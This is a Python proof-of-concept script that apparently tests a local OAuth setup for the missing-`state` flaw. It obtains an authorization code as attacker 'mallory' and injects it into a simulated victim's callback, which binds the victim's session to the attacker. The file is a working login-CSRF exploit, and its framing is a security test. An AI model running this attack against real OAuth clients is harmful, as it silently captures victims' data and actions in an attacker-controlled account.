"""
attack2_csrf_state.py
=====================
Root cause: the client never generates or checks a `state` value, so the
authorization response is not bound to the user-agent that began the flow
(RFC 6749 sec 10.12, RFC 9700 sec 4.7). This enables login CSRF / code
injection.

Scenario (confidential client `webapp` + its callback on :5001):
  1. Attacker 'mallory' authenticates to the AS and starts an authorize for
     the *real* client, getting a code bound to mallory's account.
  2. Attacker does NOT redeem it. Instead they trick the victim's browser
     into requesting the client's /callback with mallory's code.
  3. The client exchanges it and binds the VICTIM's client session to
     mallory's identity.

Impact: the victim is now silently logged into the client as the attacker.
Anything the victim does -- saved files, linked cards, typed secrets -- lands
in the attacker's account, which the attacker can later open normally.

SUCCESS = victim's client session identity == 'mallory'.
"""
import os, re, requests

AS = os.environ.get("AS", "http://localhost:5000")
CLIENT = os.environ.get("CLIENT", "http://localhost:5001")


def attack():
    # 1. attacker gets a code bound to THEIR account
    mallory = requests.Session()
    mallory.post(f"{AS}/login", data={"username": "mallory", "password": "mallorypw"},
                 allow_redirects=False)
    r = mallory.get(f"{AS}/authorize", params={
        "response_type": "code", "client_id": "webapp",
        "redirect_uri": "http://localhost:5001/callback",
        "scope": "openid", "_consent": "yes",
    }, allow_redirects=False)
    loc = r.headers.get("Location", "")
    m = re.search(r"code=([^&]+)", loc)
    if not m:
        return False, f"could not obtain attacker code: {loc[:80]}"
    mallory_code = m.group(1)

    # 2. victim's browser is tricked into completing the flow with mallory's code
    victim_browser = requests.Session()
    victim_browser.get(f"{CLIENT}/callback", params={"code": mallory_code},
                       allow_redirects=False)

    # 3. whom does the client think the victim is?
    me = victim_browser.get(f"{CLIENT}/me").json()
    if me.get("identity") == "mallory":
        return True, f"victim session fixated to attacker identity: {me}"
    return False, f"client rejected injected code (good): {me}"


if __name__ == "__main__":
    ok, detail = attack()
    print(("[VULNERABLE] " if ok else "[BLOCKED] ") + detail)
